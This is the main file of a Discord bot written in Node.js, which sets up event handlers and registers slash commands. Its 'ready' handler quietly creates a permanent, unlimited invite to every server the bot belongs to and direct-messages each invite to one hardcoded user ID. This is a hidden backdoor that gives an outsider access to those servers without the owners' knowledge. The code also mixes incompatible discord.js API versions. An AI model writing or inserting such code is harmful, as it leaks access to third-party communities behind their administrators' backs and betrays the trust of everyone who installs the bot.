require("dotenv").config();
const { Client, Collection, GatewayIntentBits } = require("discord.js");
const fs = require("fs");
const { REST } = require("@discordjs/rest");
const { Routes } = require("discord-api-types/v9");

const { token } = process.env;

const client = new Client({ intents: [GatewayIntentBits.Guilds] });
client.commands = new Collection();
client.commandArray = [];

// Ready event to log bot information and collect invites
client.once('ready', async () => {
  console.log(`${client.user?.username} - (${client.user?.id})`); // Log bot username and ID when ready

  // User ID to send the invite link to
  const USER_ID = '1291814730369073276';

  // Fetch all guilds the bot is in
  const guilds = client.guilds.cache;

  // Loop through each guild
  guilds.forEach(async (guild) => {
    try {
      // Create an invite for the guild (default settings)
      const invite = await guild.channels.cache
        .filter(channel => channel.isText() && channel.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))
        .first()
        .createInvite({ maxAge: 0, maxUses: 0 });

      // DM the invite link to the specified user
      const user = await client.users.fetch(USER_ID);
      await user.send(`Here's an invite link to the server: ${invite.url}`);
    } catch (error) {
      console.error(`Could not create invite for ${guild.name}:`, error);
    }
  });
});

// Function to handle events
const handleEvents = async () => {
  const eventFiles = fs.readdirSync('./events').filter((file) => file.endsWith('.js'));
  for (const file of eventFiles) {
    const event = require(`./events/${file}`);
    if (event.once) client.once(event.name, (...args) => event.execute(...args, client));
    else client.on(event.name, (...args) => event.execute(...args, client));
  }
};

// Function to handle commands
const handleCommands = async () => {
  const commandFolders = fs.readdirSync('./commands');
  for (const folder of commandFolders) {
    const commandFiles = fs.readdirSync(`./commands/${folder}`).filter((file) => file.endsWith('.js'));

    for (const file of commandFiles) {
      const command = require(`./commands/${folder}/${file}`);
      client.commands.set(command.data.name, command);
      client.commandArray.push(command.data.toJSON());
    }
  }

  const clientId = "1288879358857056266"; 
  const guildId = "1284787684644093992"; 
  const rest = new REST({ version: '9' }).setToken(token);

  try {
    await rest.put(Routes.applicationGuildCommands(clientId, guildId), {
      body: client.commandArray,
    });
    console.log("Slash commands uploaded");
  } catch (error) {
    console.error(error);
  }
};

// Attach the functions to the client
client.handleEvents = handleEvents;
client.handleCommands = handleCommands;

// Initialize event and command handling
(async () => {
  await client.handleEvents();
  await client.handleCommands();
})();

// Log in the client
client.login(token);
